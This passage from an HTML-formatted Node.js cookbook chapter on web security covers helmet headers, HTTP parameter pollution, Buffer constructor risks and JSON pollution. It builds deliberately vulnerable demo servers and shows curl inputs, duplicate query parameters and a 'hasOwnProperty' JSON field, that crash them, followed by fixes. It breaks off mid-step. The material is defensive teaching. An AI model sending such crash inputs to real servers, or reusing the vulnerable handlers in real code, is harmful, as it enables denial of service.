   <pre class="source-code">
app.use(
  helmet({
    referrerPolicy: { policy: 'no-referrer' },
  })
);</pre>
   <p>
    
     Additional HTTP headers can also be set using the
    
    <strong class="source-inline">
     
      helmet
     
    </strong>
    
     module.
    
    
     For more information, please refer to the Helmet
    
    
     
      documentation (
     
    
    <a href="https://helmetjs.github.io/">
     
      
       https://helmetjs.github.io/
      
     
    </a>
    
     
      ).
     
    
   </p>
   <p>
    
     Some other popular
    
    <a id="_idIndexMarker719">
    </a>
    
     web frameworks can also
    
    <a id="_idIndexMarker720">
    </a>
    
     integrate
    
    <a id="_idIndexMarker721">
    </a>
    
     the
    
    <strong class="source-inline">
     
      helmet
     
    </strong>
    
     middleware via the
    
    
     
      following modules:
     
    
   </p>
   <ul>
    <li>
     
      <strong class="bold">
       
        Koa.js
       
      </strong>
     
     
      
       :
      
     
     <a href="https://www.npmjs.com/package/koa-helmet">
      
       
        https://www.npmjs.com/package/koa-helmet
       
      
     </a>
    </li>
    <li>
     
      <strong class="bold">
       
        Fastify
       
      </strong>
     
     
      
       :
      
     
     <a href="https://www.npmjs.com/package/@fastify/helmet">
      
       
        https://www.npmjs.com/package/@fastify/helmet
       
      
     </a>
    </li>
   </ul>
   <h2 id="_idParaDest-286">
    <a id="_idTextAnchor293">
    </a>
    
     There’s more…
    
   </h2>
   <p>
    
     The
    
    <strong class="source-inline">
     
      helmet
     
    </strong>
    
     middleware
    
    <a id="_idIndexMarker722">
    </a>
    
     simply modifies the response headers to appropriate defaults.
    
    
     To demonstrate what
    
    <strong class="source-inline">
     
      helmet
     
    </strong>
    
     is doing under the covers, we can try injecting the same HTTP headers using the Node.js core
    
    
     <strong class="source-inline">
      
       http
      
     </strong>
    
    
     
      module:
     
    
   </p>
   <ol>
    <li>
     
      Create a folder called
     
     <strong class="source-inline">
      
       http-app
      
     </strong>
     
      and create a
     
     
      <strong class="source-inline">
       
        server.js
       
      </strong>
     
     
      
       file:
      
     
     <pre class="source-code">
<strong class="bold">$ mkdir http-app</strong>
<strong class="bold">$ cd http-app</strong>
<strong class="bold">$ touch server.js</strong></pre>
    </li>
    <li>
     
      Add the following code to the
     
     
      <strong class="source-inline">
       
        server.js
       
      </strong>
     
     
      
       file:
      
     
     <pre class="source-code">
const http = ('node:http');
const server = http.createServer((req, res) =&gt; {
  secureHeaders(res);
  res.end('Hello World!');
});
const secureHeaders = (res) =&gt; {
  res.setHeader('Cross-Origin-Opener-Policy', 'same-
    origin');
  res.setHeader('Cross-Origin-Resource-Policy', 'same-
    origin');
  res.setHeader('Origin-Agent-Cluster', '?1');
  res.setHeader('Referrer-Policy', 'no-referrer');
  res.setHeader('Strict-Transport-Security', 'max-
    age=15552000; includeSubDomains');
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-DNS-Prefetch-Control', 'off');
  res.setHeader('X-Download-Options', 'noopen');
  res.setHeader('X-Frame-Options', 'SAMEORIGIN');
  res.setHeader('X-Permitted-Cross-Domain-Policies',
    'none');
  res.setHeader('X-XSS-Protection', '0');
};
server.listen(3000, () =&gt; {
  console.log('Server listening on port 3000');
});</pre>
    </li>
    <li>
     
      Start
     
     
      
       the
      
     
     
      <a id="_idIndexMarker723">
      </a>
     
     
      
       server:
      
     
     <pre class="source-code">
<strong class="bold">$ node server.js</strong></pre>
    </li>
    <li>
     
      Rerun the
     
     <em class="italic">
      
       cURL
      
     </em>
     
      command and
     
     <a id="_idIndexMarker724">
     </a>
     
      observe that the headers have
     
     
      
       been injected:
      
     
     <pre class="source-code">
<strong class="bold">$ curl -I http://localhost:3000</strong>
<strong class="bold">HTTP/1.1 200 OK</strong>
<strong class="bold">Cross-Origin-Opener-Policy: same-origin</strong>
<strong class="bold">Cross-Origin-Resource-Policy: same-origin</strong>
<strong class="bold">Origin-Agent-Cluster: ?1</strong>
<strong class="bold">Referrer-Policy: no-referrer</strong>
<strong class="bold">Strict-Transport-Security: max-age=15552000; includeSubDomains</strong>
<strong class="bold">X-Content-Type-Options: nosniff</strong>
<strong class="bold">X-DNS-Prefetch-Control: off</strong>
<strong class="bold">X-Download-Options: noopen</strong>
<strong class="bold">X-Frame-Options: SAMEORIGIN</strong>
<strong class="bold">X-Permitted-Cross-Domain-Policies: none</strong>
<strong class="bold">X-XSS-Protection: 0</strong>
Date: Wed, 10 Jul 2024 14:21:31 GMT
Connection: keep-alive
Keep-Alive: timeout=5</pre>
    </li>
   </ol>
   <p>
    
     These steps demonstrate how to manually inject HTTP security headers using the Node.js core
    
    <strong class="source-inline">
     
      http
     
    </strong>
    
     module, replicating the functionality provided by the
    
    <strong class="source-inline">
     
      helmet
     
    </strong>
    
     middleware.
    
    
     This example illustrates how
    
    <strong class="source-inline">
     
      helmet
     
    </strong>
    
     enhances security by setting various HTTP headers that
    
    <a id="_idIndexMarker725">
    </a>
    
     mitigate
    
    <a id="_idIndexMarker726">
    </a>
    
     
      common vulnerabilities.
     
    
   </p>
   <h2 id="_idParaDest-287">
    <a id="_idTextAnchor294">
    </a>
    
     See also
    
   </h2>
   <ul>
    <li>
     
      The
     
     <em class="italic">
      
       Guarding against cross-site scripting
      
     </em>
     
      recipe in
     
     
      
       this chapter
      
     
    </li>
    <li>
     
      The
     
     <em class="italic">
      
       Preventing cross-site request forgery
      
     </em>
     
      recipe in
     
     
      
       this chapter
      
     
    </li>
   </ul>
   <h1 id="_idParaDest-288">
    <a id="_idTextAnchor295">
    </a>
    
     Anticipating malicious input
    
   </h1>
   <p>
    
     One of the easiest
    
    <a id="_idIndexMarker727">
    </a>
    
     groups of vulnerabilities that hackers exploit is injection attacks, with SQL injection attacks being particularly common.
    
    
     SQL injection attacks are where an attacker injects malicious SQL into an application to delete, distort, or expose data stored in
    
    
     
      the database.
     
    
   </p>
   <p>
    
     If an application accepts input in any form, you need to take necessary precautions to ensure that malicious inputs cannot exploit
    
    
     
      your application.
     
    
   </p>
   <p>
    
     Parameter pollution is a type of injection attack where the HTTP parameters of a web application’s HTTP endpoints are injected with specific malicious input.
    
    
     HTTP parameter pollution can be used to expose internal data or even cause a
    
    <strong class="bold">
     
      denial of service
     
    </strong>
    
     (
    
    <strong class="bold">
     
      DoS
     
    </strong>
    
     ) attack, where
    
    <a id="_idIndexMarker728">
    </a>
    
     an attacker tries to interrupt a resource and render it inaccessible to the resource’s
    
    
     
      intended users.
     
    
   </p>
   <p>
    
     In this recipe, we’ll look at how we can protect an HTTP server against parameter pollution attacks.
    
    
     Parameter pollution attacks are where malicious input is injected into
    
    
     
      URL parameters.
     
    
   </p>
   <h2 id="_idParaDest-289">
    <a id="_idTextAnchor296">
    </a>
    
     Getting ready
    
   </h2>
   <p>
    
     In this recipe, we’ll
    
    <a id="_idIndexMarker729">
    </a>
    
     learn how to protect an Express.js server against an HTTP parameter pollution attack.
    
    
     But first, we must create this
    
    
     
      Express.js server:
     
    
   </p>
   <ol>
    <li>
     
      Create a new directory named
     
     <strong class="source-inline">
      
       express-input
      
     </strong>
     
      for this recipe and initialize the project
     
     
      
       with
      
     
     
      <strong class="source-inline">
       
        npm
       
      </strong>
     
     
      
       :
      
     
     <pre class="source-code">
<strong class="bold">$ mkdir express-input</strong>
<strong class="bold">$ cd express-input</strong>
<strong class="bold">$ npm init --yes</strong></pre>
    </li>
    <li>
     
      Next, we need to install the
     
     
      
       Express.js module:
      
     
     <pre class="source-code">
<strong class="bold">$ npm install express</strong></pre>
    </li>
    <li>
     
      Create a file
     
     
      
       named
      
     
     
      <strong class="source-inline">
       
        server.js
       
      </strong>
     
     
      
       :
      
     
     <pre class="source-code">
<strong class="bold">$ touch server.js</strong></pre>
    </li>
    <li>
     
      Add the following code to
     
     <strong class="source-inline">
      
       server.js
      
     </strong>
     
      .
     
     
      This will create an Express.js server that is susceptible to an HTTP parameter
     
     
      
       pollution attack:
      
     
     <pre class="source-code">
const express = require('express');
const app = express();
app.get('/', (req, res) =&gt; {
  asyncWork(() =&gt; {
    const upper = (req.query.msg || '').toUpperCase();
    res.send(upper);
  });
});
const asyncWork = (callback) =&gt; {
  setTimeout(callback, 0);
};
app.listen(3000, () =&gt; {
  console.log('Server listening on port 3000');
});</pre>
     <p class="list-inset">
      
       Note that the
      
      <strong class="source-inline">
       
        asyncWork()
       
      </strong>
      
       function is for demonstrational purposes only.
      
      
       In a real application, you could expect some asynchronous tasks to happen, such as a query to be made to a database or
      
      
       
        external service.
       
      
     </p>
    </li>
   </ol>
   <p>
    
     Now that we’ve created
    
    <a id="_idIndexMarker730">
    </a>
    
     a vulnerable server, we’re ready to start this recipe, where we’ll demonstrate how to exploit this vulnerability and learn how to
    
    
     
      mitigate it.
     
    
   </p>
   <h2 id="_idParaDest-290">
    <a id="_idTextAnchor297">
    </a>
    
     How to do it…
    
   </h2>
   <p>
    
     So far, we’ve created an Express.js server that responds to the
    
    <strong class="source-inline">
     
      /
     
    </strong>
    
     request and handles a single parameter,
    
    <strong class="source-inline">
     
      msg
     
    </strong>
    
     .
    
    
     The Express.js server returns the
    
    <strong class="source-inline">
     
      msg
     
    </strong>
    
     value we pass it but in
    
    
     
      uppercase form:
     
    
   </p>
   <ol>
    <li>
     
      First, start
     
     
      
       the server:
      
     
     <pre class="source-code">
<strong class="bold">$ node server.js</strong>
<strong class="bold">Server listening on port 3000</strong></pre>
    </li>
    <li>
     
      In a second terminal window, we should test that the server is working as expected by sending
     
     
      
       a request:
      
     
     <pre class="source-code">
<strong class="bold">$ curl http://localhost:3000/\?msg\=hello</strong>
<strong class="bold">HELLO%</strong></pre>
    </li>
    <li>
     
      Let’s see what happens when we pass the
     
     <strong class="source-inline">
      
       msg
      
     </strong>
     
      
       parameter twice:
      
     
     <pre class="source-code">
<strong class="bold">$ curl http://localhost:3000/\?msg\=hello\&amp;msg\=world</strong>
<strong class="bold">curl: (52) Empty reply from server</strong></pre>
    </li>
    <li>
     
      Now, if we go back
     
     <a id="_idIndexMarker731">
     </a>
     
      to our first terminal window, we’ll see that the server has crashed with the
     
     
      
       following error:
      
     
     <pre class="source-code">
<strong class="bold">Server listening on port 3000</strong>
<strong class="bold">/Users/bgriggs/Node.js-Cookbook/Chapter09/express-input/server.js:6</strong>
<strong class="bold">    const upper = (req.query.msg || '').toUpperCase();</strong>
<strong class="bold">                                        ^</strong>
<strong class="bold">TypeError: (req.query.msg || "").toUpperCase is not a function</strong>
<strong class="bold">    at Timeout._onTimeout (/Users/bgriggs/Node.js-Cookbook/Chapter09/express-input/server.js:6:41)</strong>
<strong class="bold">    at listOnTimeout (node:internal/timers:573:17)</strong>
<strong class="bold">    at process.processTimers (node:internal/timers:514:7)</strong>
<strong class="bold">Node.js v22.9.0</strong></pre>
     <p class="list-inset">
      
       So, it’s possible to cause the server to crash just by sending duplicate parameters.
      
      
       This makes it fairly easy for a perpetrator to launch an effective
      
      
       
        DoS attack.
       
      
     </p>
    </li>
    <li>
     
      The error message states
     
     <strong class="source-inline">
      
       .toUpperCase is not a function
      
     </strong>
     
      .
     
     
      The
     
     <strong class="source-inline">
      
       toUpperCase()
      
     </strong>
     
      function is available on
     
     <strong class="source-inline">
      
       String.prototype
      
     </strong>
     
      .
     
     
      This means that the value we call this function on is not of the
     
     <strong class="source-inline">
      
       String.prototype
      
     </strong>
     
      type, resulting in
     
     <strong class="source-inline">
      
       TypeError
      
     </strong>
     
      .
     
     
      This happened because the multiple
     
     <strong class="source-inline">
      
       msg
      
     </strong>
     
      values have been transformed into an array.
     
     
      To protect against this, we should add some logic so that we always take the last value of
     
     <strong class="source-inline">
      
       msg
      
     </strong>
     
      when multiple values are specified.
     
     
      Let’s add this logic to a copy of
     
     <strong class="source-inline">
      
       server.js
      
     </strong>
     
      , which we’ll
     
     
      
       name
      
     
     
      <strong class="source-inline">
       
        fixed-server.js
       
      </strong>
     
     
      
       :
      
     
     <pre class="source-code">
<strong class="bold">$ cp server.js fixed-server.js</strong></pre>
    </li>
    <li>
     
      Now, add the following two lines to our
     
     <strong class="source-inline">
      
       asyncWork()
      
     </strong>
     
      callback function within the HTTP
     
     <strong class="source-inline">
      
       GET
      
     </strong>
     
      request handler.
     
     
      The first line extracts the value of
     
     <strong class="source-inline">
      
       req.query.msg
      
     </strong>
     
      to a variable named
     
     <strong class="source-inline">
      
       msg
      
     </strong>
     
      .
     
     
      The second line will use the
     
     <strong class="source-inline">
      
       array.pop()
      
     </strong>
     
      method to
     
     <a id="_idIndexMarker732">
     </a>
     
      override the value of
     
     <strong class="source-inline">
      
       msg
      
     </strong>
     
      with the final element
     
     
      
       of
      
     
     
      <strong class="source-inline">
       
        Array
       
      </strong>
     
     
      
       :
      
     
     <pre class="source-code">
    let msg = req.query.msg;
    if (Array.isArray(msg)) msg = msg.pop();</pre>
    </li>
    <li>
     
      Next, the following line needs to be updated so that it references the
     
     
      <strong class="source-inline">
       
        msg
       
      </strong>
     
     
      
       variable:
      
     
     <pre class="source-code">
    const upper = (msg || '').toUpperCase();</pre>
    </li>
    <li>
     
      Start the
     
     
      
       fixed server:
      
     
     <pre class="source-code">
<strong class="bold">$ node fixed-server.js</strong></pre>
    </li>
    <li>
     
      Now, let’s retry our request, where we pass the
     
     <strong class="source-inline">
      
       msg
      
     </strong>
     
      
       parameter twice:
      
     
     <pre class="source-code">
<strong class="bold">$ curl http://localhost:3000/\?msg\=hello\&amp;msg\=world</strong>
<strong class="bold">WORLD%</strong></pre>
     <p class="list-inset">
      
       Our logic to always set the
      
      <strong class="source-inline">
       
        msg
       
      </strong>
      
       variable to the last value is working.
      
      
       Observe that the server no
      
      
       
        longer crashes.
       
      
     </p>
    </li>
   </ol>
   <p>
    
     With that, we’ve learned how URL parameters can be exploited to cause DoS attacks and how we can add logic to our code to guard against
    
    
     
      these attacks.
     
    
   </p>
   <h2 id="_idParaDest-291">
    <a id="_idTextAnchor298">
    </a>
    
     How it works…
    
   </h2>
   <p>
    
     Injection attacks are made possible when inputs aren’t sanitized appropriately.
    
    
     In this recipe, we wrongly assumed that the
    
    <strong class="source-inline">
     
      msg
     
    </strong>
    
     parameter would only ever be
    
    
     
      a string.
     
    
   </p>
   <p>
    
     Many Node.js web frameworks support duplicate parameters in URLs, despite there being no specification on how these should
    
    
     
      be handled.
     
    
   </p>
   <p>
    
     Express.js depends on the
    
    <strong class="source-inline">
     
      qs
     
    </strong>
    
     module for URL parameter handling.
    
    
     The
    
    <strong class="source-inline">
     
      qs
     
    </strong>
    
     module’s approach to handling multiple parameters of the same name is to convert the duplicate names into an array.
    
    
     As demonstrated in this recipe, this conversion results in code breakages and
    
    
     
      unexpected behavior.
     
    
   </p>
   <p>
    
     In this recipe, our server crashed because it was trying to call the
    
    <strong class="source-inline">
     
      toUpperCase()
     
    </strong>
    
     function on an
    
    <strong class="source-inline">
     
      Array
     
    </strong>
    
     global object, which doesn’t exist on that type.
    
    
     This means that attackers have a very easily exploitable method of disabling servers by supplying malformed/malicious input.
    
    
     Other than enabling DoS-style attacks, not sanitizing and validating input
    
    <a id="_idIndexMarker733">
    </a>
    
     parameters can lead to XSS attacks.
    
    
     XSS attacks will be covered in more detail in the
    
    <em class="italic">
     
      Guarding against XSS attacks
     
    </em>
    
     recipe of
    
    
     
      this chapter.
     
    
   </p>
   <h2 id="_idParaDest-292">
    <a id="_idTextAnchor299">
    </a>
    
     There’s more…
    
   </h2>
   <p>
    
     Node.js
    
    <strong class="source-inline">
     
      Buffer
     
    </strong>
    
     objects
    
    <a id="_idIndexMarker734">
    </a>
    
    
    
     can be exploited by attackers if used incorrectly in application code.
    
    <strong class="source-inline">
     
      Buffer
     
    </strong>
    
     objects represent a fixed-length series of bytes and are a subclass of JavaScript’s
    
    <strong class="source-inline">
     
      Uint8Array()
     
    </strong>
    
     class.
    
    
     In many cases, you’ll be interacting with
    
    <strong class="source-inline">
     
      Buffer
     
    </strong>
    
     objects via higher-level APIs, such as using
    
    <strong class="source-inline">
     
      fs.readFile()
     
    </strong>
    
     to read files.
    
    
     However, in cases where you need to interact with binary data directly, you may use
    
    <strong class="source-inline">
     
      Buffer
     
    </strong>
    
     objects since they provide low-level fine-grained APIs for
    
    
     
      data manipulation.
     
    
   </p>
   <p>
    
     In past years, a lot of attention was brought to the unsafe uses of Node.js’s
    
    <strong class="source-inline">
     
      Buffer
     
    </strong>
    
     constructor.
    
    
     Earlier concerns about using the
    
    <strong class="source-inline">
     
      Buffer
     
    </strong>
    
     constructor were regarding it not zero-filling new
    
    <strong class="source-inline">
     
      Buffer
     
    </strong>
    
     instances, leading to the risk of sensitive data being exposed
    
    
     
      via memory.
     
    
   </p>
   <p class="callout-heading">
    
     Important note
    
   </p>
   <p class="callout">
    
     All of the following examples were created via the Node.js REPL.
    
    
     The Node.js REPL can be started by entering
    
    <strong class="source-inline">
     
      $ node
     
    </strong>
    
     in your
    
    
     
      terminal window.
     
    
   </p>
   <p>
    
     In Node.js 6, calling
    
    <strong class="source-inline">
     
      new Buffer(int)
     
    </strong>
    
     would create a new
    
    <strong class="source-inline">
     
      Buffer
     
    </strong>
    
     object but not override any
    
    
     
      existing memory:
     
    
   </p>
   <pre class="console">
&gt; new Buffer(10)
&lt;Buffer b7 20 00 00 00 00 00 00 00 2c&gt;</pre>
   <p>
    
     The security implications of this were recognized.
    
    
     By not overwriting the data when we initialize a new
    
    <strong class="source-inline">
     
      Buffer
     
    </strong>
    
     object, we could accidentally expose some of the previous memory.
    
    
     In the worst cases, this could expose
    
    
     
      sensitive data.
     
    
   </p>
   <p>
    
     However, in versions of Node.js later than version 8, calling
    
    <strong class="source-inline">
     
      Buffer(int)
     
    </strong>
    
     will result in a zero-filled
    
    <strong class="source-inline">
     
      Buffer
     
    </strong>
    
     object of
    
    
     <strong class="source-inline">
      
       int
      
     </strong>
    
    
     
      size:
     
    
   </p>
   <pre class="console">
$ node
&gt; new Buffer(10)
&lt;Buffer 00 00 00 00 00 00 00 00 00 00&gt;</pre>
   <p>
    
     Calling
    
    <strong class="source-inline">
     
      new Buffer(int)
     
    </strong>
    
     is still
    
    <a id="_idIndexMarker735">
    </a>
    
     deprecated and as of Node.js 22, using this constructor will emit a
    
    
     
      deprecation warning:
     
    
   </p>
   <pre class="console">
&gt; new Buffer(10)
&lt;Buffer 00 00 00 00 00 00 00 00 00 00&gt;
&gt; (node:46906) [DEP0005] DeprecationWarning: Buffer() is deprecated due to security and usability issues. Please use the Buffer.alloc(), Buffer.allocUnsafe(), or Buffer.from() methods instead.
(Use `node --trace-deprecation ...` to show where the warning was created)</pre>
   <p>
    
     This is because there
    
    <a id="_idIndexMarker736">
    </a>
    
     are still security risks associated with using the new
    
    <strong class="source-inline">
     
      Buffer(int)
     
    </strong>
    
     constructor.
    
    
     Let’s demonstrate that
    
    
     
      risk now.
     
    
   </p>
   <p>
    
     Imagine that our application accepted some user input in JSON form and we created a
    
    <strong class="source-inline">
     
      new Buffer()
     
    </strong>
    
     object from one of
    
    
     
      the values:
     
    
   </p>
   <pre class="source-code">
<strong class="bold">&gt; let greeting = { "msg" : "hello" }</strong>
undefined
<strong class="bold">&gt; new Buffer(greeting.msg)</strong>
&lt;Buffer 68 65 6c 6c 6f&gt;
&gt; (node:47025) [DEP0005] DeprecationWarning: Buffer() is deprecated due to security and usability issues. Please use the Buffer.alloc(), Buffer.allocUnsafe(), or Buffer.from() methods instead.
(Use `node --trace-deprecation ...` to show where the warning was created)</pre>
   <p>
    
     We can see that this works as expected (ignoring the deprecation warning).
    
    
     Calling
    
    <strong class="source-inline">
     
      Buffer(string)
     
    </strong>
    
     creates a new
    
    <strong class="source-inline">
     
      Buffer
     
    </strong>
    
     object containing the string value.
    
    
     Now, let’s see what happens if we set
    
    <strong class="source-inline">
     
      msg
     
    </strong>
    
     to a number rather than
    
    
     
      a string:
     
    
   </p>
   <pre class="source-code">
<strong class="bold">&gt; greeting = { "msg" : 10 }</strong>
{ msg: 10 }
<strong class="bold">&gt; new Buffer(greeting.msg)</strong>
&lt;Buffer 00 00 00 00 00 00 00 00 00 00&gt;
&gt; (node:47073) [DEP0005] DeprecationWarning: Buffer() is deprecated due to security and usability issues. Please use the Buffer.alloc(), Buffer.allocUnsafe(), or Buffer.from() methods instead.
(Use `node --trace-deprecation ...` to show where the warning was created)</pre>
   <p>
    
     This has created a
    
    <strong class="source-inline">
     
      Buffer
     
    </strong>
    
     object of size
    
    <strong class="source-inline">
     
      10
     
    </strong>
    
     .
    
    
     So, an attacker could pass any value via the
    
    <strong class="source-inline">
     
      msg
     
    </strong>
    
     property, and
    
    <a id="_idIndexMarker737">
    </a>
    
     a
    
    <strong class="source-inline">
     
      Buffer
     
    </strong>
    
     object of that size would be created.
    
    
     A simple DoS attack could be launched by
    
    <a id="_idIndexMarker738">
    </a>
    
     the attacker by supplying large integer values on
    
    
     
      each request.
     
    
   </p>
   <p>
    
     The deprecation warning recommends using
    
    <strong class="source-inline">
     
      Buffer.from(req.body.string)
     
    </strong>
    
     instead.
    
    
     Upon passing the
    
    <strong class="source-inline">
     
      Buffer.from()
     
    </strong>
    
     method, a number will throw
    
    
     
      an exception:
     
    
   </p>
   <pre class="source-code">
<strong class="bold">&gt; new Buffer.from(greeting.msg)</strong>
Uncaught:
TypeError [ERR_INVALID_ARG_TYPE]: The first argument must be of type string or an instance of Buffer, ArrayBuffer, or Array or an Array-like Object. Received type number (10)</pre>
   <p>
    
     This helps protect our code from unexpected input.
    
    
     To create a new
    
    <strong class="source-inline">
     
      Buffer
     
    </strong>
    
     object of a given size, you should use the
    
    
     <strong class="source-inline">
      
       Buffer.alloc(int)
      
     </strong>
    
    
     
      method:
     
    
   </p>
   <pre class="source-code">
<strong class="bold">&gt; new Buffer.alloc(10)</strong>
&lt;Buffer 00 00 00 00 00 00 00 00 00 00&gt;</pre>
   <p>
    
     There is also a
    
    <strong class="source-inline">
     
      Buffer.allocUnsafe()
     
    </strong>
    
     constructor.
    
    
     The
    
    <strong class="source-inline">
     
      Buffer.allocUnsafe()
     
    </strong>
    
     constructor provides similar behavior to that seen in Node.js versions before Node.js 7, where the memory wasn’t entirely zero-filled
    
    
     
      on initialization:
     
    
   </p>
   <pre class="source-code">
<strong class="bold">$ new Buffer.allocUnsafe(10)</strong>
&lt;Buffer 00 00 00 00 00 00 00 00 ff ff&gt;</pre>
   <p>
    
     For the reasons
    
    <a id="_idIndexMarker739">
    </a>
    
     mentioned earlier, use the
    
    <strong class="source-inline">
     
      Buffer.allocUnsafe()
     
    </strong>
    
     constructor
    
    <a id="_idIndexMarker740">
    </a>
    
     
      with caution.
     
    
   </p>
   <h2 id="_idParaDest-293">
    <a id="_idTextAnchor300">
    </a>
    
     See also
    
   </h2>
   <ul>
    <li>
     
      The
     
     <em class="italic">
      
       Preventing JSON pollution
      
     </em>
     
      recipe in
     
     
      
       this chapter
      
     
    </li>
    <li>
     
      The
     
     <em class="italic">
      
       Guarding against cross-site scripting
      
     </em>
     
      in
     
     
      
       this chapter
      
     
    </li>
    <li>
     
      The
     
     <em class="italic">
      
       Preventing cross-site request forgery
      
     </em>
     
      in
     
     
      
       this chapter
      
     
    </li>
   </ul>
   <h1 id="_idParaDest-294">
    <a id="_idTextAnchor301">
    </a>
    
     Preventing JSON pollution
    
   </h1>
   <p>
    
     The JavaScript
    
    <a id="_idIndexMarker741">
    </a>
    
     language allows all
    
    <strong class="source-inline">
     
      Object
     
    </strong>
    
     attributes to be altered.
    
    
     In a JSON pollution attack, an attacker leverages this ability to override built-in attributes and functions with
    
    
     
      malicious code.
     
    
   </p>
   <p>
    
     Applications that accept JSON as user input are the most susceptible to these attacks.
    
    
     In the most severe cases, it’s possible to crash a server by just supplying additional values in JSON input.
    
    
     This can make the server vulnerable to DoS attacks via
    
    
     
      JSON pollution.
     
    
   </p>
   <p>
    
     The key to preventing JSON pollution attacks is to validate all JSON input.
    
    
     This can be done manually or by defining a schema for your JSON to
    
    
     
      validate against.
     
    
   </p>
   <p>
    
     In this recipe, we’re going to demonstrate a JSON pollution attack and learn how to protect against these attacks by validating our JSON input.
    
    
     Specifically, we’ll be using
    
    <strong class="bold">
     
      Another JSON Schema Validator
     
    </strong>
    
     (
    
    <strong class="bold">
     
      Ajv
     
    </strong>
    
     ) to
    
    <a id="_idIndexMarker742">
    </a>
    
     validate our
    
    
     
      JSON input.
     
    
   </p>
   <h2 id="_idParaDest-295">
    <a id="_idTextAnchor302">
    </a>
    
     Getting ready
    
   </h2>
   <p>
    
     To prepare for this recipe, we must create a server that’s susceptible to a JSON pollution attack.
    
    
     The server will accept
    
    <strong class="source-inline">
     
      msg
     
    </strong>
    
     and
    
    <strong class="source-inline">
     
      name
     
    </strong>
    
     as the body payload and respond with a message built with
    
    
     
      these values:
     
    
   </p>
   <ol>
    <li>
     
      First, let’s create a new directory named
     
     <strong class="source-inline">
      
       json-pollution
      
     </strong>
     
      to work in and initialize it
     
     
      
       with
      
     
     
      <strong class="source-inline">
       
        npm
       
      </strong>
     
     
      
       :
      
     
     <pre class="source-code">
<strong class="bold">$ mkdir json-pollution</strong>
<strong class="bold">$ cd json-pollution</strong>
<strong class="bold">$ npm init --yes</strong></pre>
    </li>
    <li>
     
      Then, create a file
     
     
      
       named
      
     
     
      <strong class="source-inline">
       
        server.js
       
      </strong>
     
     
      
       :
      
     
     <pre class="source-code">
<strong class="bold">$ touch server.js</strong></pre>
    </li>
    <li>
     
      Add the
     
     <a id="_idIndexMarker743">
     </a>
     
      following code
     
     
      
       to
      
     
     
      <strong class="source-inline">
       
        server.js
       
      </strong>
     
     
      
       :
      
     
     <pre class="source-code">
const http = require('node:http');
const { STATUS_CODES } = http;
const server = http.createServer((req, res) =&gt; {
  if (req.method === 'POST' &amp;&amp; req.url === '/') {
    greeting(req, res);
    return;
  }
  res.statusCode = 404;
  res.end(STATUS_CODES[res.statusCode]);
});
const greeting = (req, res) =&gt; {
  let data = '';
  req.on('data', (chunk) =&gt; (data += chunk));
  req.on('end', () =&gt; {
    try {
      data = JSON.parse(data);
    } catch (e) {
      res.end('');
      return;
    }
    if (data.hasOwnProperty('name')) {
      res.end(`${data.msg} ${data.name}`);
    } else {
      res.end(data.msg);
    }
  });
};
server.listen(3000, () =&gt; {
  console.log('Server listening on port 3000');
});</pre>
    </li>
   </ol>
   <p>
    
     Now that we’ve created our vulnerable server, we’re ready to start
    
    
     
      this recipe.
     
    
   </p>
   <h2 id="_idParaDest-296">
    <a id="_idTextAnchor303">
    </a>
    
     How to do it…
    
   </h2>
   <p>
    
     In this recipe, we’re going to demonstrate a JSON pollution attack and learn how to use a JSON schema to protect our applications from
    
    
     
      these attacks:
     
    
   </p>
   <ol>
    <li>
     
      Start the server with the
     
     
      
       following command:
      
     
     <pre class="source-code">
<strong class="bold">$ node server.js</strong>
<strong class="bold">Server listening on port 3000</strong></pre>
    </li>
    <li>
     
      Next, we’ll send an HTTP
     
     <strong class="source-inline">
      
       POST
      
     </strong>
     
      request to
     
     <strong class="source-inline">
      
       http://localhost:3000
      
     </strong>
     
      using
     
     <em class="italic">
      
       cURL
      
     </em>
     
      .
     
     
      We’ll supply the
     
     <strong class="source-inline">
      
       curl
      
     </strong>
     
      command with the
     
     <strong class="source-inline">
      
       -X
      
     </strong>
     
      argument to specify the HTTP request method and the
     
     <strong class="source-inline">
      
       -d
      
     </strong>
     
      argument to supply the data.
     
     
      In a second terminal window, send the
     
     <a id="_idIndexMarker744">
     </a>
     
      following
     
     
      <strong class="source-inline">
       
        cURL
       
      </strong>
     
     
      
       request:
      
     
     <pre class="source-code">
<strong class="bold">$ curl -H "Content-Type: application/json" -X POST -d '{"msg": "Hello", "name": "Beth" }' http://localhost:3000/</strong>
<strong class="bold">Hello Beth%</strong></pre>
     <p class="list-inset">
      
       As expected, the server responds with
      
      
       
        a greeting.
       
      
     </p>
    </li>
    <li>
     
      Now, let’s try altering the payload so that it sends an additional JSON property
     
     
      
       named
      
     
     
      <strong class="source-inline">
       
        hasOwnProperty
       
      </strong>
     
     
      
       :
      
     
     <pre class="source-code">
<strong class="bold">$ curl -H "Content-Type: application/json" -X POST -d '{"msg": "Hello", "name": "Beth", "hasOwnProperty": 0 }' http://localhost:3000/</strong>
<strong class="bold">curl: (52) Empty reply from server</strong></pre>
     <p class="list-inset">
      
       Note the empty reply from
      
      
       
        the server.
       
      
     </p>
    </li>
    <li>
     
      Check the terminal window where you’re running the server.
     
     
      You should see that it’s crashed with the
     
     
      
       following error:
      
     
     <pre class="source-code">
<strong class="bold">Server listening on port 3000</strong>
<strong class="bold">/Users/bgriggs/Node.js-Cookbook/Chapter09/json-pollution/server.js:29</strong>
<strong class="bold">    if (data.hasOwnProperty('name')) {</strong>
<strong class="bold">             ^</strong>
<strong class="bold">TypeError: data.hasOwnProperty is not a function</strong>
<strong class="bold">    at IncomingMessage.&lt;anonymous&gt; (/Users/bgriggs/Node.js-Cookbook/Chapter09/json-pollution/server.js:29:14)</strong>
<strong class="bold">    at IncomingMessage.emit (node:events:519:28)</strong>
<strong class="bold">    at endReadableNT (node:internal/streams/readable:1696:12)</strong>
<strong class="bold">    at process.processTicksAndRejections (node:internal/process/task_queues:82:21)</strong>
<strong class="bold">Node.js v22.9.0</strong></pre>
    </li>
    <li>
     
      Our server has crashed because the
     
     <strong class="source-inline">
      
       hasOwnProperty()
      
     </strong>
     
      function has been overridden by the
     
     <strong class="source-inline">
      
       hasOwnProperty
      
     </strong>
     
      value in the JSON input.
     
     
      We can protect against this by
     
     <a id="_idIndexMarker745">
     </a>
     
      validating our JSON input using the Ajv module.
     
     
      So, install the Ajv module
     
     
      
       from
      
     
     
      <strong class="source-inline">
       
        npm
       
      </strong>
     
     
      
       :
      
     
     <pre class="source-code">
<strong class="bold">$ npm install ajv</strong></pre>
    </li>
    <li>
     
      Next, we’ll copy our
     
     <strong class="source-inline">
      
       server.js
      
     </strong>
